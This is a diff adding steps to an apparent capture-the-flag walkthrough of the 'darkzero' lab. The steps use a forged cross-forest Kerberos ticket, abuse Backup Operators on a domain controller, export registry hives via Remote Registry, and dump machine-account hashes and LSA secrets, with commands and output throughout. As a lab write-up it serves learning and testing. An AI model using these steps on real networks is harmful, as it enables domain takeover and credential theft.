@@ -4044,6 +4044,297 @@ Valid starting       Expires              Service principal
 <br>
 </div>
 
+#### 4.13 — Configure the attacking host for cross-realm authentication
+
+**Why this step:** The forged ticket must be presented to DC01 in the target forest. The attacking host requires network reachability, name resolution for both realms, KDC locations, and clock synchronisation within Kerberos' five-minute tolerance.
+
+**Commands:**
+
+Route the internal subnet through the foothold — leave running in a dedicated terminal:
+
+bash
+
+```bash
+sshuttle -r josh@TARGET_IP 172.16.20.0/24
+```
+
+Add name resolution for both domains and both DCs:
+
+bash
+
+```bash
+echo "172.16.20.2 DC02.darkzero.ext darkzero.ext DARKZERO.EXT" | sudo tee -a /etc/hosts
+echo "172.16.20.1 DC01.darkzero.htb dc01 DARKZERO.HTB darkzero.htb" | sudo tee -a /etc/hosts
+```
+
+Write a Kerberos client configuration naming both realms:
+
+bash
+
+```bash
+sudo tee /etc/krb5.conf > /dev/null << 'EOF'
+[libdefaults]
+    default_realm = DARKZERO.EXT
+    dns_lookup_realm = false
+    dns_lookup_kdc = false
+    rdns = false
+
+[realms]
+    DARKZERO.EXT = {
+        kdc = 172.16.20.2
+        admin_server = 172.16.20.2
+    }
+    DARKZERO.HTB = {
+        kdc = 172.16.20.1
+        admin_server = 172.16.20.1
+    }
+
+[domain_realm]
+    .darkzero.ext = DARKZERO.EXT
+    darkzero.ext = DARKZERO.EXT
+    .darkzero.htb = DARKZERO.HTB
+    darkzero.htb = DARKZERO.HTB
+EOF
+```
+
+Determine the clock offset by comparing the domain-synced host against the attacking host:
+
+bash
+
+```bash
+# On SRV01
+date -u
+# On Kali
+date -u
+```
+
+Apply the offset per-command rather than changing the system clock:
+
+bash
+
+```bash
+sudo apt install -y faketime
+faketime "$(date -u -d '+7 hours' '+%Y-%m-%d %H:%M:%S')" <command>
+```
+
+**Breakdown:**
+
+|Component|Purpose|Simple Explanation|
+|---|---|---|
+|`sshuttle -r <host> <subnet>`|Transparent TCP routing over SSH|Makes the internal network reachable from Kali|
+|`[realms]` with both KDCs|Tells the client where each realm's KDC lives|Which server to ask for tickets in each domain|
+|`[domain_realm]`|Maps DNS names to Kerberos realms|Which realm a given hostname belongs to|
+|`rdns = false`|Disable reverse-DNS SPN canonicalisation|Same fix as `SASL_NOCANON`, for MIT Kerberos|
+|`faketime "<timestamp>" <cmd>`|Run a command with a shifted clock|Fixes skew without touching the system time|
+
+**Result:**
+
+```
+SRV01: Wed Jul 29 06:30:13 PM UTC 2026
+Kali:  Wed Jul 29 11:30:19 AM UTC 2026
+```
+
+Offset: **+7 hours**.
+
+**Key findings:**
+
+- Three distinct failures had to be resolved in sequence before authentication succeeded, each producing a misleading error:
+
+|Error|Actual cause|Fix|
+|---|---|---|
+|`Errno Connection error (DARKZERO.EXT:88)`|Realm name unresolvable|`/etc/hosts` entry|
+|`KDC_ERR_ETYPE_NOSUPP`|RC4 ticket rejected|Reforge with `-aesKey`|
+|`KRB_AP_ERR_SKEW`|7-hour clock difference|`faketime` wrapper|
+|`Errno Connection error (DARKZERO.HTB:88)`|Referral target unresolvable|Second `/etc/hosts` entry|
+
+- **Dead end:** NTP synchronisation is impossible through sshuttle, which tunnels TCP only. `ntpdate` and `rdate -n` both use UDP and fail with `no eligible servers`. Reading the clock from the domain-joined foothold and applying a manual offset is the workable approach.
+- `faketime` in this build requires an absolute timestamp; relative offsets such as `+7h` are rejected. Generate the timestamp with `date -u -d '+7 hours'`.
+- The offset expression must be recomputed for each command. A stale value drifts out of the five-minute window and reproduces `KRB_AP_ERR_SKEW`.
+
+**Next:** Authenticate to DC01 with the forged ticket and establish the extent of the granted access.
+<div align="center">
+<br>
+<br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+<br>
+</div>
+
+#### 4.14 — Authenticate to DC01 and enumerate accessible shares
+
+**Why this step:** The forged ticket asserts membership in a group nested inside Backup Operators on DC01. Establish an SMB session across the trust to confirm the SID survived filtering and determine what access it confers.
+
+**Command:**
+
+bash
+
+```bash
+FT="$(date -u -d '+7 hours' '+%Y-%m-%d %H:%M:%S')"
+faketime "$FT" impacket-smbclient -k -no-pass DC01.darkzero.htb
+```
+
+At the prompt:
+
+```
+shares
+use C$
+ls
+```
+
+**Breakdown:**
+
+|Component|Purpose|Simple Explanation|
+|---|---|---|
+|`-k`|Use Kerberos from the ccache|Authenticate with the forged ticket|
+|`-no-pass`|Supply no password|The ticket is the credential|
+|`shares`|List available SMB shares|What can I connect to|
+|`use C$`|Connect to the administrative disk share|Open the system drive|
+
+**Result:**
+
+```
+# shares
+ADMIN$
+C$
+IPC$
+NETLOGON
+SYSVOL
+
+# use C$
+# ls
+drw-rw-rw-  0  Windows
+drw-rw-rw-  0  Users
+drw-rw-rw-  0  Program Files
+...
+```
+
+Access to subdirectories and files is denied:
+
+```
+# cd Users\Administrator
+[-] STATUS_ACCESS_DENIED
+# get SYSTEM
+[-] STATUS_ACCESS_DENIED
+```
+
+**Key findings:**
+
+- **The cross-forest attack succeeded.** DC01 accepted the forged ticket and granted access to administrative shares (`ADMIN$`, `C$`) — access no ordinary domain user of `darkzero.ext` would receive. The injected RID 1603 crossed the trust boundary and resolved locally to Backup Operators membership.
+- **`SeBackupPrivilege` does not apply to ordinary file reads.** Directory listings succeed, but opening any file or descending into an ACL-protected directory returns `STATUS_ACCESS_DENIED`. The privilege engages only when a file is opened with the `FILE_FLAG_BACKUP_SEMANTICS` flag, which impacket's smbclient does not set.
+- **Dead end:** `C:\Users\Administrator\Desktop\root.txt` cannot be read directly. Nor can `C:\Windows\System32\config\{SAM,SYSTEM,SECURITY}`, nor their `RegBack` copies, despite all being listable.
+- **Dead end:** DRSUAPI-based DCSync against DC01 with this ticket fails — `Policy SPN target name validation might be restricting full DRSUAPI dump`, then `ERROR_DS_DRA_BAD_DN`. Backup Operators grants file-read rights, not directory replication rights.
+
+##### 4.14.1 Theory — Why listing works but reading does not
+
+`SeBackupPrivilege` exists so that backup software can copy files its operator has no permission to read. Crucially, it is not applied automatically. Windows checks the privilege only when a file handle is requested with `FILE_FLAG_BACKUP_SEMANTICS` set — an explicit signal meaning "I am performing a backup; bypass the DACL."
+
+A generic SMB client issues ordinary `CreateFile` requests without that flag, so the ACL is enforced normally and access is denied. Directory _enumeration_ is a different operation governed by different permissions, which is why `ls` succeeds against paths whose contents cannot be opened.
+
+The consequence is that Backup Operators cannot be exploited with a plain file-copy tool. It must be exercised through something that invokes the privilege server-side. The Remote Registry service does exactly this: `reg save` runs on the DC, opens the hive with backup semantics, and writes a copy to a destination path — and that copy is a new file inheriting the destination directory's ACL rather than the hive's.
+
+**Next:** Export the registry hives server-side via Remote Registry to a location readable over SMB.
+<div align="center">
+<br>
+<br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+<br>
+</div>
+
+#### 4.15 — Export registry hives via Remote Registry and retrieve them
+
+**Why this step:** The registry hives cannot be read directly over SMB. Remote Registry's backup function runs server-side with `SeBackupPrivilege` applied, producing copies whose permissions derive from the destination directory.
+
+**Commands:**
+
+bash
+
+```bash
+FT="$(date -u -d '+7 hours' '+%Y-%m-%d %H:%M:%S')"
+faketime "$FT" impacket-reg -k -no-pass DC01.darkzero.htb backup \
+  -o 'C:\Windows\SYSVOL\sysvol\darkzero.htb\scripts'
+```
+
+bash
+
+```bash
+faketime "$(date -u -d '+7 hours' '+%Y-%m-%d %H:%M:%S')" impacket-smbclient -k -no-pass DC01.darkzero.htb
+```
+
+```
+use NETLOGON
+ls
+get SYSTEM.save
+get SECURITY.save
+```
+
+Then locally:
+
+bash
+
+```bash
+impacket-secretsdump -system SYSTEM.save -security SECURITY.save LOCAL
+```
+
+**Breakdown:**
+
+|Component|Purpose|Simple Explanation|
+|---|---|---|
+|`impacket-reg ... backup`|Invoke `reg save` over the Remote Registry service|Ask the DC to copy its own registry hives|
+|`-o '<path>'`|Server-side destination for the copies|Where the DC writes them|
+|`C:\Windows\SYSVOL\sysvol\<domain>\scripts`|The NETLOGON share's backing directory|A world-readable path exposed as its own SMB share|
+|`use NETLOGON`|Connect to the logon-scripts share|Reach the files without traversing `C$`|
+|`secretsdump ... LOCAL`|Parse hives offline|Extract secrets from the downloaded files|
+
+**Result:**
+
+```
+[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...
+[*] Saved HKLM\SAM to C:\Windows\SYSVOL\sysvol\darkzero.htb\scripts\SAM.save
+[*] Saved HKLM\SYSTEM to C:\Windows\SYSVOL\sysvol\darkzero.htb\scripts\SYSTEM.save
+[*] Saved HKLM\SECURITY to C:\Windows\SYSVOL\sysvol\darkzero.htb\scripts\SECURITY.save
+```
+
+```
+# use NETLOGON
+# ls
+-rw-rw-rw-     28672  SAM.save
+-rw-rw-rw-     36864  SECURITY.save
+-rw-rw-rw-  16883712  SYSTEM.save
+```
+
+```
+[*] Target system bootKey: 0xd7104de0ccfc39117fa0498a3dfbd8a3
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC
+$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:686d06e419d66abfa5fefac2618cdcea
+[*] DPAPI_SYSTEM
+dpapi_machinekey:0x22c0c905bd49a8e038bfd5b8a30b1b96a52cb087
+[*] NL$KM
+NL$KM:fa36c7d5c082abb578e117f05e36135b...
+```
+
+**Key findings:**
+
+- **DC01's machine account hash recovered: `686d06e419d66abfa5fefac2618cdcea`.** A domain controller's computer account inherently holds `DS-Replication-Get-Changes-All`, so this credential permits the DCSync that the forged ticket could not perform.
+- **The destination path determines whether the exported hives are retrievable.** Copies written to `C:\Windows\Temp` and `C:\Users\Public` were created successfully but could not be downloaded — this principal is denied directory traversal into both. Writing into the SYSVOL scripts directory places the files under the NETLOGON share, which is world-readable by design and requires no traversal of `C$`.
+- The Remote Registry service was not running and impacket started it via named pipe automatically.
+- `SYSTEM` provides the boot key that decrypts LSA secrets; `SECURITY` holds the encrypted secrets themselves. Both are required. `SAM` is unnecessary on a domain controller, which stores no meaningful local accounts.
+- DPAPI machine keys and the `NL$KM` cached-credential key were also recovered, enabling decryption of DPAPI-protected secrets and any cached domain logons.
+- The `$FT` timestamp variable expires. A stale value between commands reproduces `KRB_AP_ERR_SKEW`; recompute it inline for each invocation.
+
+**Next:** DCSync `darkzero.htb` using the machine account credential.
+<div align="center">
+<br>
+<br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+<br>
+</div>
+
 
 <div align="center">
 <br>
